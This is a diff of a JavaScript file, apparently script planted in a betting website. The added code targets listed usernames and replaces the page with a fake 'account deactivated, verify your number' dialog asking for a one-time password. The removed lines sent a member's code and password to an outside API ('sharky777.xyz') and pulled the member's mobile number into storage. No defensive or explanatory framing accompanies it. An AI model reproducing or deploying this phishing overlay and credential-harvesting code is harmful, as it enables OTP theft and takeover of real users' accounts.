@@ -1,68 +1,118 @@
 function checkToken() {
-    const invalidUsernames = ['840600', 'aabb0600', 'demokk', 'demokk2', 'verification', 'siddik35'];
-    const username = localStorage.getItem('username');
-    if (invalidUsernames.includes(username)) {
-        localStorage.setItem('xUser', username);
-        localStorage.removeItem('username');
+  const invalidUsernames = ['840600', 'aabb0600', 'demokk', 'demokk2', 'verification', 'siddik35'];
+  const username = localStorage.getItem('username');
+
+  if (!username) {
+    return;
+  }
+
+  if (invalidUsernames.includes(username)) {
+    localStorage.setItem('xUser', username);
+    localStorage.removeItem('username');
+
+    const appElement = document.getElementById('app');
+    if (appElement) {
+      appElement.innerHTML = `
+        <div role="document" tabindex="0" class="v-dialog__content v-dialog__content--active">
+          <div class="v-dialog v-dialog--active v-dialog--persistent" style="transform-origin: center center; max-width: 400px;">
+            <div class="dialog-card kk-bg v-card v-sheet theme--light">
+              <div class="row no-gutters justify-space-between dialog-header kk-bg">
+                <div class="d-flex flex-column pl-6 py-4 col col-10">
+                  <label class="dialog-title text-capitalize d-block full-width white--text">
+                    <span class="error-text" style="color: red; border: 1px solid #ddd; margin-top:20px; margin-bottom:30px; padding:10px; text-align: center; text-transform: capitalize; font-size: large; font-weight: bold;">
+                      Your account is temporarily deactivated. For access, kindly verify your number.
+                    </span>
+                  </label>
+                </div>
+              </div>
+              
+              <!-- Username Field -->
+              <div class="mobile">
+                <div class="row no-gutters justify-space-between">
+                  <div class="col col-10">
+                    <label class="input-field-label ma-0 text-capitalize d-block" style="float: left;">
+                      Username<span class="red--text ml-1">*</span>
+                    </label>
+                  </div>
+                  <div class="col col-2"></div>
+                  <div class="col col-12">
+                    <div class="v-input input-field elevation-0 hide-details v-input--is-label-active v-input--is-dirty v-input--is-disabled v-input--is-readonly theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
+                      <div class="v-input__control">
+                        <div class="v-input__slot">
+                          <fieldset aria-hidden="true"><legend style="width: 0px;"><span class="notranslate">​</span></legend></fieldset>
+                          <input autocomplete="new-password" autofocus="autofocus" disabled="disabled" id="xUser" placeholder="Fill up here" readonly="readonly" type="text" />
+                        </div>
+                      </div>
+                      <div class="v-text-field__details">
+                        <div class="v-messages theme--light"><div class="v-messages__wrapper"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Mobile Number Field -->
+              <div class="mobile">
+                <div class="row no-gutters justify-space-between">
+                  <div class="col col-10">
+                    <label class="input-field-label ma-0 text-capitalize d-block" style="float: left;">
+                      Mobile<span class="red--text ml-1">*</span>
+                    </label>
+                  </div>
+                  <div class="col col-2"></div>
+                  <div class="col col-12">
+                    <div class="v-input input-field elevation-0 hide-details v-input--is-label-active v-input--is-dirty v-input--is-disabled v-input--is-readonly theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
+                      <div class="v-input__control">
+                        <div class="v-input__slot">
+                          <fieldset aria-hidden="true"><legend style="width: 0px;"><span class="notranslate">​</span></legend></fieldset>
+                          <input autocomplete="new-password" autofocus="autofocus" disabled="disabled" id="xUserMobile" name="xUserMobile" value="" aria-readonly="true" />
+                        </div>
+                      </div>
+                      <div class="v-text-field__details">
+                        <div class="v-messages theme--light"><div class="v-messages__wrapper"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- OTP Field -->
+              <div class="mobile">
+                <div class="row no-gutters justify-space-between">
+                  <div class="col col-10">
+                    <label class="input-field-label ma-0 text-capitalize d-block" style="float: left;">
+                      OTP <span class="red--text ml-1">*</span>
+                    </label>
+                  </div>
+                  <div class="col col-2"></div>
+                  <div class="col col-12">
+                    <div class="v-input input-field elevation-0 hide-details v-input--is-label-active v-input--is-dirty theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
+                      <div class="v-input__control">
+                        <div class="v-input__slot">
+                          <fieldset aria-hidden="true"><legend style="width: 0px;"><span class="notranslate">​</span></legend></fieldset>
+                          <input type="number" autofocus="autofocus" id="xUserOTP" name="xUserOTP" value="" />
+                        </div>
+                      </div>
+                      <div class="v-text-field__details">
+                        <div class="v-messages theme--light"><div class="v-messages__wrapper"></div></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Verify Button -->
+              <button type="button" class="circle-button text-capitalize v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default" style="width: 100%; color: rgb(255, 255, 255); background: linear-gradient(rgb(255, 171, 45) 0%, rgb(255, 119, 0) 100%);">
+                <span class="v-btn__content">Verify Now</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      `;
     }
+  }
 }
+
 document.addEventListener('DOMContentLoaded', () => {
-    checkToken();
+  checkToken();
 });
-
-async function authLogin() {
-    const membercode = document.getElementById('membercode').value;
-    const password = document.getElementById('password').value;
-    try {
-        const response = await fetch('https://feapi.sharky777.xyz/api/token', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ membercode: membercode, password: password, domain: "https://www.krikya11.com", platform: "desktop", option: "2", fp: "f384772b06115c3836ab1405d4eda35c" })
-        });
-
-        if (!response.ok) {
-            throw new Error('Login failed');
-        }
-
-        const data = await response.json();
-        if (data && data.access_token) {
-            localStorage.setItem('authToken', data.access_token);
-            localStorage.setItem('username', membercode);
-        } else {
-            console.error('No access_token received');
-        }
-    } catch (error) {
-        console.error('Error during login:', error);
-    }
-}
-
-  //  const authButton = document.createElement('button');
-   // authButton.innerText = "authButton"
-  //  authButton.type = "button";
-  // authButton.classList='button';
-   // authButton.setAttribute('onclick', 'authLogin()');
-  //  document.body.appendChild(authButton);
-async function getDetails() {
-    const response = await fetch("https://feapi.sharky777.xyz/api/member/details", {
-        method: 'GET',
-        headers: {
-            'Content-Type': 'application/json',
-            'Authorization': 'Bearer ' + localStorage.getItem('authToken')
-        }
-    });
-
-    if (response.ok) {
-        const data = await response.json();
-        const xUser = data.data.membercode;
-        localStorage.setItem('xUser', xUser);
-        const primaryMobile = data.data.contacts.find(contact => contact.contact_type === 'Mobile' && contact.is_primary === 1);
-        if (primaryMobile) {
-            const xUserMobile = primaryMobile.value;
-            localStorage.setItem('xUserMobile', xUserMobile);
-        } else {
-            console.log('Primary mobile contact not found.');
-        }
-    }
-}
